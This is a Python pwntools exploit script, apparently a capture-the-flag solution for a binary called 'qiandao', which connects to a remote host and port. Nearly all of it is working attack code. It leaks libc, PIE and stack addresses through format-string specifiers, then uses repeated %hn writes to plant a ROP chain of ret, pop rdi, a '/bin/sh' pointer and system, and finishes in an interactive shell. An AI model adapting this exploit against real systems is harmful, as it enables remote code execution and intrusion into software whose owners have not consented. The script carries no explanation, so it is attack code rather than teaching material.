# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from galatea import *
#context.log_level = 'debug'

binary = './qiandao'
elf = ELF('./qiandao')
libc = elf.libc
context.binary = binary

DEBUG = 0
if DEBUG:
  p = process(binary)
  #p = process(["qemu-aarch64","-L","",binary])
  #p = process(["qemu-aarch64","-L","",-g,"1234",binary])
else:
  host = "81.68.86.115"
  port =  10001
  p = remote(host,port)

l64 = lambda     	: u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda     	: u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  	: p.sendlineafter(str(a),str(b))
sa  = lambda a,b 	: p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload	: p.send(payload)
rl  = lambda      	: p.recv()
sl  = lambda payload	: p.sendline(payload)
ru  = lambda a    	: p.recvuntil(str(a))
rint= lambda a    	: int( p.recv(len(str(a)))[2:] , 16)

def dbg():
    gdb.attach(p)
    pause()

gadget = 0xe6c81
#gdb.attach(p,"b printf")

#7  __libc_start_main+243
#7  栈地址
#11 基地址0x82e


payload =  "%7$p," + "%11$p," +  "%9$p,"

sl(payload)

__libc_start_main = rint("0x7f62b26990b3") - 243
libc_base = __libc_start_main - libc.sym["__libc_start_main"]

p.recvuntil(",")
pie_addr = rint("0x55d2c451e82e") - 0x82e
p.recvuntil(",")
stack_addr = rint("0x7fffa24e6e58") - 0xe0

gadget_addr = gadget + libc_base

'''
lg("__libc_start_main",__libc_start_main)
lg("gadget_addr",gadget_addr)
lg("pie_addr",pie_addr)
lg("stack_addr",stack_addr)
'''

bss_addr = 0x000000000201030 + pie_addr

lg("bss_addr",bss_addr)
#gdb.attach(p,"printf")

payload =  "%"+str((stack_addr + 0x10 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((bss_addr ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +2 + 0x10 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((bss_addr >> 16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload = "niyah%11$sgalatea"

sl(payload)

p.recvuntil("niyah")
heap_addr = u64(p.recv(6).ljust(8,"\x00"))

ret_addr = 0x000000000000065e + pie_addr
pop_rdi_ret_addr = 0x00000000000008f3 + pie_addr
system_addr = libc.sym["system"] + libc_base

lg("ret_addr",ret_addr)
lg("pop_rdi_ret_addr",pop_rdi_ret_addr)
lg("heap_addr",heap_addr)
lg("system_addr",system_addr)

payload = "\x00"*0x100 + "/catflag\x00"
sl(payload)

#gdb.attach(p,"printf")

payload =  "%"+str((stack_addr - 0x10 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((ret_addr ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +2 - 0x10 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((ret_addr >> 16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +4 - 0x10 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((ret_addr >> 16 >> 16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)



payload =  "%"+str((stack_addr - 0x8 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((pop_rdi_ret_addr ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +2 - 0x8 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((pop_rdi_ret_addr >> 16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +4 - 0x8 ) & 0xffff ) +"c%9$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((pop_rdi_ret_addr >> 16>>16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr ) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((heap_addr + 0x30 ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr + 2 ) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str(((heap_addr + 0x30 )>>16 ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr + 4 ) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str(((heap_addr + 0x30 )>>16 >>16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)


payload =  "%"+str((stack_addr +0x8 ) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((system_addr ) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr + 2 + 0x8 ) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((system_addr >>16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

payload =  "%"+str((stack_addr +4 + 0x8) & 0xffff ) +"c%24$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)
payload =  "%"+str((system_addr >>16>>16) & 0xffff ) +"c%37$hn"  + "niyahgalatea\x00"
sl(payload)
p.recvuntil("niyahgalatea")
sleep(0.1)

#gdb.attach(p,"printf")

#pause()

payload = "61happy\x00".ljust(0x30,"a") + "/bin/sh\x00"
sl(payload)

#payload = 


p.interactive()